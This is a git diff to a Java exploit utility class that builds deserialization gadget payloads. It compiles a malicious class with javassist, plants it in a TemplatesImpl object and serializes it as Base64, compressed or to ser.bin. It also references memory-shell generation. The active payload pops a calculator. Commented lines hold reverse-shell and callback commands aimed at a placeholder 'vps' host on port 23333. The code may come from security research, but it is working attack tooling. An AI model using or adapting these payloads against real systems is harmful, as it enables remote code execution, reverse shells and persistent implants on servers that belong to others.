@@ -3,7 +3,6 @@ package com.example;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import javassist.CannotCompileException;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
@@ -11,6 +10,10 @@ import javassist.CtConstructor;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.util.Base64;
+import java.util.zip.Deflater;
+import java.util.zip.DeflaterOutputStream;
+
+import static com.example.String_Short.cleanBytecode;
 
 public class Utils {
     public static String getTemplatesImplBase64() throws Exception{
@@ -23,11 +26,23 @@ public class Utils {
         CtClass superClass = pool.get(AbstractTranslet.class.getName());
         ctClass.setSuperclass(superClass);
         CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
-        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
+        String plateform = System.getProperties().getProperty("os.name");
+        String command = "";
+        if(command.isEmpty()){
+            if (plateform.contains("Windows")){
+                command = "calc.exe";
+            }else if (plateform.contains("Linux")){
+                command = "xcalc";
+            }else if (plateform.contains("Mac")){
+                command = "open -a Calculator";
+            }
+        }
+        constructor.setBody("Runtime.getRuntime().exec(\""+command+"\");");
 //        constructor.setBody("Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/vps/23333 0>&1\");");
 //        constructor.setBody("Runtime.getRuntime().exec(\"nc vps 23333 -e /bin/sh\");");
 //        constructor.setBody("Runtime.getRuntime().exec(\"curl vps:23333\");");
         ctClass.addConstructor(constructor);
+//        return cleanBytecode(ctClass.toBytecode());
         return ctClass.toBytecode();
     }
 
@@ -41,7 +56,7 @@ public class Utils {
         byte[][] bytes = new byte[][]{GenerateEvil()};
         TemplatesImpl templates = new TemplatesImpl();
         SetValue(templates, "_bytecodes", bytes);
-        SetValue(templates, "_name", "0w0");
+        SetValue(templates, "_name", "");
         SetValue(templates, "_tfactory", null);
         return templates;
     }
@@ -52,6 +67,26 @@ public class Utils {
         String str = new String(Base64.getEncoder().encode(baos.toByteArray()));
         return str;
     }
+    public static String deflaterSerialize(Object o) throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        // 使用 Deflater 设置为最高压缩率
+        Deflater deflater = new Deflater(Deflater.BEST_COMPRESSION);
+        DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(baos, deflater);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(deflaterOutputStream);
+        objectOutputStream.writeObject(o);
+        // 关闭流
+        objectOutputStream.flush();
+        deflaterOutputStream.finish();
+        deflaterOutputStream.close();
+        String str = new String(Base64.getEncoder().encode(baos.toByteArray()));
+        return str;
+    }
+
+    public static void Serbin(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+
     public static void UnSerialize(String str) throws Exception{
         ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(str)));
         objectInputStream.readObject();
@@ -77,16 +112,11 @@ public class Utils {
         return data;
     }
 
-    public static void Serbin(Object obj) throws Exception {
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
-        oos.writeObject(obj);
-    }
-
     public static TemplatesImpl memTemplatesImpl() throws Exception{
         byte[][] bytes = new byte[][]{GenerateMemShell()};
         TemplatesImpl templates = new TemplatesImpl();
         SetValue(templates, "_bytecodes", bytes);
-        SetValue(templates, "_name", "0w0");
+        SetValue(templates, "_name", "");
         SetValue(templates, "_tfactory", new TransformerFactoryImpl());
         return templates;
     }
